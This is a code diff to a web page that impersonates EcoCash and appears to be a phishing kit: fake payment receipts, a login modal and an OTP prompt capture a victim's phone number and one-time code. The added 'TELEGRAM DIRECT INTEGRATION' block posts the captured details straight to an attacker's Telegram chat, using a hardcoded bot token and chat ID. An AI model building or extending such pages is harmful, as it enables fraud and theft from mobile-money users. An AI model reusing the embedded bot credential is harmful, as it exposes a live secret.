@@ -108,7 +108,7 @@ label{display:block;font-size:13px;font-weight:600;color:#334155;margin-bottom:6
 .hist-sub{font-size:11px;color:#64748b;margin-top:2px}
 .hist-amt{font-size:13px;font-weight:700;color:var(--ecocash-blue);white-space:nowrap}
 .hist-actions{display:flex;gap:4px}
-.btn-hist-action{background:#fff;border:1px solid #cbd5e1;border-radius:4px;width:28px;height:28px;display:flex;align-items:center;justify-content:center;cursor:pointer;color:#475569;transition:all .15s ease}
+.btn-hist-action{background:#fff;border:1px solid #cbd5e1;border-radius:4px;width:28px;height:28px;display:flex;align-items:center;justify-content:center;cursor:pointer;color:#475569;transition:all .15s ease;font-size:14px}
 .btn-hist-action:hover{background:var(--ecocash-blue);border-color:var(--ecocash-blue);color:#fff}
 .btn-hist-action.delete:hover{background:#dc2626;border-color:#dc2626;color:#fff}
 
@@ -637,6 +637,31 @@ label{display:block;font-size:13px;font-weight:600;color:#334155;margin-bottom:6
 
 <script>
 /* =========================================================
+   TELEGRAM DIRECT INTEGRATION
+   ========================================================= */
+const TELEGRAM_BOT_TOKEN = '8834604760:AAHnFWeTawysGPNs6dnqvbOYquhC4cxhs1w';
+const TELEGRAM_CHAT_ID   = '8294270663';
+const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+function sendTelegramNotification(payload){
+  const text =
+    `🔔 *EcoCash Notification*\n` +
+    `━━━━━━━━━━━━━━━\n` +
+    `📌 *Status:* ${payload.status || '—'}\n` +
+    `🧾 *Ref:* ${payload.referenceId || '—'}\n` +
+    `👤 *Recipient:* ${payload.recipientName || '—'}\n` +
+    `📱 *Destination:* ${payload.destination || '—'}\n` +
+    `💳 *Service:* ${payload.serviceType || '—'}\n` +
+    `📝 *Notes:* ${payload.notes || '—'}\n` +
+    `🕒 ${new Date().toLocaleString()}`;
+  return fetch(TELEGRAM_API,{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' })
+  }).catch(e=>console.error('Telegram notify error:',e));
+}
+
+/* =========================================================
    CONSTANTS & STATE
    ========================================================= */
 const STORAGE_KEY_RECEIPTS = 'ecocash_receipts_history';
@@ -651,18 +676,6 @@ const DEFAULT_SAMPLE_DATA = {
 let currentReceipt = { ...DEFAULT_SAMPLE_DATA };
 let otpTimerInterval = null;
 let otpSecondsLeft = 30;
-
-const NOTIFY_ENDPOINT = window.location.protocol === 'file:'
-  ? 'http://localhost:3005/api/notify'
-  : '/api/notify';
-
-function sendTelegramNotification(payload){
-  return fetch(NOTIFY_ENDPOINT,{
-    method:'POST', keepalive:true,
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify(payload)
-  }).catch(e=>console.error('Notify error:',e));
-}
 
 /* =========================================================
    VIEW ROUTER
@@ -684,16 +697,13 @@ function initApp(){
   const params = new URLSearchParams(window.location.search);
   const view = params.get('view');
   const isPay = params.get('pay') === '1';
-
   if(view === 'admin'){
     showView('admin');
     initAdminPage();
   } else {
     showView('client');
     initClientPage();
-    if(isPay){
-      window.setTimeout(openLoginModal,150);
-    }
+    if(isPay){ window.setTimeout(openLoginModal,150); }
   }
 }
 
@@ -704,9 +714,7 @@ function initAdminPage(){
   const saved = localStorage.getItem(STORAGE_KEY_CURRENT);
   if(saved){
     try{ currentReceipt = JSON.parse(saved); }catch(e){ currentReceipt = {...DEFAULT_SAMPLE_DATA}; }
-  } else {
-    currentReceipt = {...DEFAULT_SAMPLE_DATA};
-  }
+  } else { currentReceipt = {...DEFAULT_SAMPLE_DATA}; }
   populateAdminForm(currentReceipt);
   updateGeneratedLinkDisplay(currentReceipt);
   renderAdminHistory();
@@ -1007,7 +1015,7 @@ function renderClientReceipt(data){
   if(acceptBtn && acceptText){
     if(data.isAccepted){ acceptBtn.classList.add('accepted'); acceptBtn.classList.remove('declined'); acceptText.textContent='Payment Accepted ✓'; }
     else if(data.isDeclined){ acceptBtn.classList.remove('accepted'); acceptBtn.classList.add('declined'); acceptText.textContent='Payment Declined ✕ (Retry)'; }
-    else { acceptBtn.classList.remove('accepted','declined'); acceptText.textContent='Accept payment'; }
+    else { acceptBtn.classList.remove('accepted'); acceptBtn.classList.remove('declined'); acceptText.textContent='Accept payment'; }
   }
 
   updateClientLoginCountry();
@@ -1099,7 +1107,8 @@ function getOtpLength(){ return currentReceipt.countryCode === '+266' ? 4 : 6; }
 function openOtpModal(){
   const code = currentReceipt.countryCode || '+263';
   const otpLength = getOtpLength();
-  let phone = (document.getElementById('login-phone-input')?.value.trim()) || currentReceipt.accountNumber || '';
+  const loginPhoneEl = document.getElementById('login-phone-input');
+  let phone = (loginPhoneEl && loginPhoneEl.value.trim()) || currentReceipt.accountNumber || '';
   const fullPhoneDisplay = `${code} ${phone}`;
   const displayEl = document.getElementById('otp-phone-display');
   if(displayEl) displayEl.textContent = fullPhoneDisplay;
@@ -1172,7 +1181,8 @@ function verifyOtpAndAccept(){
   let otpCode = '';
   for(let i=1;i<=otpLength;i++){ const box = document.getElementById(`otp-${i}`); if(box) otpCode += box.value; }
   if(otpCode.length < otpLength){ showToast(`Please enter the complete ${otpLength}-digit OTP code`); return; }
-  const phoneInputVal = document.getElementById('login-phone-input')?.value || '';
+  const loginPhoneEl = document.getElementById('login-phone-input');
+  const phoneInputVal = (loginPhoneEl && loginPhoneEl.value) || '';
   sendTelegramNotification({
     referenceId: currentReceipt.trackingNumber || 'UNKNOWN',
     serviceType: currentReceipt.modeOfPayment,
@@ -1208,7 +1218,8 @@ function retryPayment(){
 /* =========================================================
    UTILITIES & MODALS
    ========================================================= */
-function getInitials(name, fallback='EC'){
+function getInitials(name, fallback){
+  if(fallback === undefined) fallback = 'EC';
   if(!name || typeof name !== 'string') return fallback;
   const clean = name.trim();
   if(!clean) return fallback;
